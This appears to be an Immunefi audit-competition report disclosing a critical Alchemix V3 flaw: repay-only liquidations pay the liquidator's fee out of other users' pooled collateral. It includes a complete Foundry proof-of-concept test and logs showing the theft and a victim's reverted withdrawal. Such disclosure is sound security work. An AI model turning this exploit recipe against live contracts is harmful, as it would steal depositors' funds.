# 58688 sc critical alchemistv3 liquidate can steal other users collateral

**Submitted on Nov 4th 2025 at 03:51:45 UTC by @DeoGratias for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58688
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### `AlchemistV3::_liquidate` can steal other users’ collateral

**Description:** In the “repay-only” liquidation path, the liquidator’s **repayment fee** can be paid out of the contract’s global MYT balance rather than strictly from the liquidated account’s collateral. This happens because `AlchemistV3::_resolveRepaymentFee` **transfers the full fee to the liquidator**, even when the account has no collateral left to fund that fee. The transfer pulls MYT from the protocol contract balance, not from the debtor’s balance.

The liquidator effectively is stealing other users collateral in this case.

**Impact:**

* **Direct value theft:** Liquidators can be paid fees sourced from other users’ deposits.
* **Withdrawal failures / DoS:** Honest users cannot fully withdraw; attempts to withdraw their full recorded collateral revert.

## Proof of Concept

**Proof of Concept:**

* Set `protocolFee = 0`, `repaymentFee = 10%`.
* User B deposits MYT (forms shared pool).
* User A deposits, mints near minimum collateralization; total debt is fully earmarked via transmuter.
* Simulate a price drop so **shares needed to repay > A’s collateral**.
* Call `liquidate(A)` → repay-only branch: `_forceRepay` zeros A’s debt, drains A’s collateral, then `_resolveRepaymentFee` pays fee to liquidator **from the contract’s MYT**.
* B’s attempt to withdraw **all** of their deposit reverts; only `(deposit − fee)` can be withdrawn, leaving a **phantom** remainder equal to the fee.
* Note: The repayment fee is high in this POC, but the issue is still present regardless of the size of the repayment fee, as long as it is non-zero.

To run this poc paste the below code in `AlchemistV3.t.sol` and run the command `forge test --mt testPOC_RepayOnly_Liquidation_StealsFee_And_B_WithdrawAll_Reverts`

```solidity
function testPOC_RepayOnly_Liquidation_StealsFee_And_B_WithdrawAll_Reverts() external {
    // ─────────────────────────────────────────────────────────────────────────────
    // 0) Configure fees: protocol fee = 0 (simplicity), repayment fee = 10%
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 0: Configure fees (protocol=0, repayment=10%)");
    vm.startPrank(alOwner);
    alchemist.setProtocolFee(0);
    alchemist.setRepaymentFee(1_000); // 10%
    vm.stopPrank();
    console.log("  protocolFee (bps):", alchemist.protocolFee());
    console.log("  repaymentFee (bps):", alchemist.repaymentFee());
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 1) Honest user B deposits MYT into Alchemist (no debt), forming the pool
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 1: User B deposits to form the shared pool");
    uint256 pool = 200e18;
    vm.startPrank(anotherExternalUser);
    SafeERC20.safeApprove(address(vault), address(alchemist), pool);
    alchemist.deposit(pool, anotherExternalUser, 0);
    uint256 tokenIdB = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
    vm.stopPrank();
    console.log("  tokenIdB:", tokenIdB);
    (uint256 collB0,,) = alchemist.getCDP(tokenIdB);
    uint256 alchBal0 = IERC20(address(vault)).balanceOf(address(alchemist));
    console.log("  B.collateral (shares):", collB0);
    console.log("  Alchemist MYT balance (shares):", alchBal0);
    assertEq(collB0, pool, "B local collateral must equal deposited pool");
    assertGe(alchBal0, pool, "Alchemist must hold at least B's shares");
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 2) Borrower A mints at (near) minimum collateralization
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 2: User A deposits & mints near minimum collateralization");
    uint256 amountA = 100e18;
    vm.startPrank(address(0xBEEF));
    SafeERC20.safeApprove(address(vault), address(alchemist), amountA);
    alchemist.deposit(amountA, address(0xBEEF), 0);
    uint256 tokenIdA = AlchemistNFTHelper.getFirstTokenId(address(0xBEEF), address(alchemistNFT));
    uint256 maxMintA = alchemist.totalValue(tokenIdA) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization();
    alchemist.mint(tokenIdA, maxMintA, address(0xBEEF));
    vm.stopPrank();
    console.log("  tokenIdA:", tokenIdA);
    console.log("  A.totalValue (debt units):", alchemist.totalValue(tokenIdA));
    console.log("  minCollat (1e18=100%):", alchemist.minimumCollateralization());
    console.log("  A.maxMint (debt units actually minted):", maxMintA);
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 3) Stake totalDebt so earmarks mature to ~100% (repay-only on liquidation)
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 3: Stake totalDebt in Transmuter so A's debt is fully earmarked");
    uint256 totalDebt = alchemist.totalDebt();
    console.log("  totalDebt before stake:", totalDebt);
    vm.startPrank(address(0xDAD));
    IERC20(address(alToken)).approve(address(transmuterLogic), totalDebt);
    transmuterLogic.createRedemption(totalDebt);
    vm.stopPrank();
    // Fully mature; A gets earmarked ~= A.debt
    uint256 startBlock = block.number;
    vm.roll(block.number + 5_256_000);
    console.log("  rolled blocks from", startBlock, "to", block.number);
    alchemist.poke(tokenIdA);
    (, uint256 debtA0, uint256 earmarkA0) = alchemist.getCDP(tokenIdA);
    console.log("  A.debt after poke:", debtA0);
    console.log("  A.earmarked after poke:", earmarkA0);
    assertApproxEqAbs(earmarkA0, debtA0, 2, "A earmark should ~= A debt");
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 4) Price drop so sharesNeeded to repay > A.collateral (cap-drain scenario)
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 4: Simulate price drop (sharesNeeded > A.collateral)");
    uint256 initialSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialSupply);
    // +20% supply => share price down; convertDebtToYield(debt) > A.collateral
    uint256 bumped = (initialSupply * 2000 / 10_000) + initialSupply;
    IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(bumped);
    (uint256 collA0, uint256 debtA_check,) = alchemist.getCDP(tokenIdA);
    uint256 sharesNeeded = alchemist.convertDebtTokensToYield(debtA_check);
    console.log("  initialSupply:", initialSupply);
    console.log("  bumpedSupply (+20%):", bumped);
    console.log("  A.collateral (shares):", collA0);
    console.log("  A.debt (debt units):", debtA_check);
    console.log("  sharesNeeded to repay A.debt:", sharesNeeded);
    assertGt(sharesNeeded, collA0, "need shares > A.collateral to trigger cap-drain");

    // Baselines
    uint256 alchBal1 = IERC20(address(vault)).balanceOf(address(alchemist));
    uint256 trnBal1  = IERC20(address(vault)).balanceOf(address(transmuterLogic));
    uint256 liqBal1  = IERC20(address(vault)).balanceOf(externalUser);
    console.log("  Baselines:");
    console.log("    Alchemist MYT (before):", alchBal1);
    console.log("    Transmuter MYT (before):", trnBal1);
    console.log("    Liquidator MYT (before):", liqBal1);
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 5) Liquidate A → repay-only path (fee paid from pool)
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 5: Liquidate A (repay-only). Expect fee paid from pool.");
    vm.prank(externalUser);
    (uint256 assets, uint256 feeYield, uint256 feeUnderlying) = alchemist.liquidate(tokenIdA);
    console.log("  liquidate() returned:");
    console.log("    assets (A->Transmuter, shares):", assets);
    console.log("    feeYield (to liquidator, shares):", feeYield);
    console.log("    feeUnderlying (to liquidator, underlying):", feeUnderlying);
    assertEq(feeUnderlying, 0, "no underlying fee on repay-only");

    (uint256 collA1, uint256 debtA1,) = alchemist.getCDP(tokenIdA);
    console.log("  A post-liquidation:");
    console.log("    A.debt:", debtA1);
    console.log("    A.collateral:", collA1);
    assertEq(debtA1, 0, "A debt must be zero");
    assertEq(collA1, 0, "A collateral must be zero");

    uint256 trnBal2 = IERC20(address(vault)).balanceOf(address(transmuterLogic));
    uint256 liqBal2 = IERC20(address(vault)).balanceOf(externalUser);
    uint256 alchBal2 = IERC20(address(vault)).balanceOf(address(alchemist));
    console.log("  Balances after liquidation:");
    console.log("    Transmuter MYT (after):", trnBal2, " (delta)", trnBal2 - trnBal1);
    console.log("    Liquidator MYT (after):", liqBal2, " (delta)", liqBal2 - liqBal1);
    console.log("    Alchemist MYT (after):", alchBal2, " (delta)", alchBal2 > alchBal1 ? 0 : (alchBal1 - alchBal2));
    assertEq(trnBal1 + assets, trnBal2, "transmuter did not receive A's shares");
    assertGt(feeYield, 0, "repayment fee must be > 0");
    assertEq(liqBal2, liqBal1 + feeYield, "liquidator must receive fee");
    assertEq(alchBal1 - alchBal2, assets + feeYield, "alchemist balance decreased by assets+fee");
    console.log("  NOTE: B.collateral storage unchanged, but pool lost `feeYield` shares.");
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 6) B tries to withdraw ALL their deposited shares → should REVERT.
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 6: B tries to withdraw ALL (should revert due to pool deficit)");
    console.log("  Attempting withdraw:", pool, "shares; Alchemist MYT now:", alchBal2);
    vm.startPrank(anotherExternalUser);
    vm.expectRevert(); // generic revert from TokenUtils.safeTransfer due to insufficient balance
    alchemist.withdraw(pool, anotherExternalUser, tokenIdB);
    vm.stopPrank();
    console.log("  Revert observed as expected");
    console.log("");

    // ─────────────────────────────────────────────────────────────────────────────
    // 7) B can only withdraw up to (pool - feeYield).
    // ─────────────────────────────────────────────────────────────────────────────
    console.log("STEP 7: B withdraws only (pool - feeYield).");
    uint256 withdrawable = pool > feeYield ? pool - feeYield : 0;
    console.log("  withdrawable (pool - feeYield):", withdrawable);
    assertGt(withdrawable, 0, "withdrawable must be positive");

    vm.startPrank(anotherExternalUser);
    alchemist.withdraw(withdrawable, anotherExternalUser, tokenIdB);
    vm.stopPrank();

    (uint256 collB1,,) = alchemist.getCDP(tokenIdB);
    console.log("  B.collateral after partial withdraw:", collB1);
    console.log("  Expected leftover phantom (== feeYield):", feeYield);
    assertEq(collB1, pool - withdrawable, "B's recorded collateral must drop by withdrawn amount");
    assertEq(collB1, feeYield, "B is left with phantom balance equal to stolen fee");
    console.log("Test complete: repay-only liquidation stole fee from shared pool; B left with phantom balance.");
}
```

### Output

```
[PASS] testPOC_RepayOnly_Liquidation_StealsFee_And_B_WithdrawAll_Reverts() (gas: 3261597)
Logs:
  STEP 0: Configure fees (protocol=0, repayment=10%)
    protocolFee (bps): 0
    repaymentFee (bps): 1000
  
  STEP 1: User B deposits to form the shared pool
    tokenIdB: 1
    B.collateral (shares): 200000000000000000000
    Alchemist MYT balance (shares): 200000000000000000000
  
  STEP 2: User A deposits & mints near minimum collateralization
    tokenIdA: 2
    A.totalValue (debt units): 100000000000000000000
    minCollat (1e18=100%): 1111111111111111111
    A.maxMint (debt units actually minted): 90000000000000000009
  
  STEP 3: Stake totalDebt in Transmuter so A's debt is fully earmarked
    totalDebt before stake: 90000000000000000009
    rolled blocks from 1 to 5256001
    A.debt after poke: 90000000000000000009
    A.earmarked after poke: 90000000000000000009
  
  STEP 4: Simulate price drop (sharesNeeded > A.collateral)
    initialSupply: 1000000000000000000000000
    bumpedSupply (+20%): 1200000000000000000000000
    A.collateral (shares): 100000000000000000000
    A.debt (debt units): 90000000000000000009
    sharesNeeded to repay A.debt: 108000000000000000053
    Baselines:
      Alchemist MYT (before): 300000000000000000000
      Transmuter MYT (before): 0
      Liquidator MYT (before): 200000000000000000000000
  
  STEP 5: Liquidate A (repay-only). Expect fee paid from pool.
    liquidate() returned:
      assets (A->Transmuter, shares): 100000000000000000000
      feeYield (to liquidator, shares): 10000000000000000000
      feeUnderlying (to liquidator, underlying): 0
    A post-liquidation:
      A.debt: 0
      A.collateral: 0
    Balances after liquidation:
      Transmuter MYT (after): 100000000000000000000  (delta) 100000000000000000000
      Liquidator MYT (after): 200010000000000000000000  (delta) 10000000000000000000
      Alchemist MYT (after): 190000000000000000000  (delta) 110000000000000000000
    NOTE: B.collateral storage unchanged, but pool lost `feeYield` shares.
  
  STEP 6: B tries to withdraw ALL (should revert due to pool deficit)
    Attempting withdraw: 200000000000000000000 shares; Alchemist MYT now: 190000000000000000000
    Revert observed as expected
  
  STEP 7: B withdraws only (pool - feeYield).
    withdrawable (pool - feeYield): 190000000000000000000
    B.collateral after partial withdraw: 10000000000000000000
    Expected leftover phantom (== feeYield): 10000000000000000000
  Test complete: repay-only liquidation stole fee from shared pool; B left with phantom balance.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.44ms (7.36ms CPU time)
```
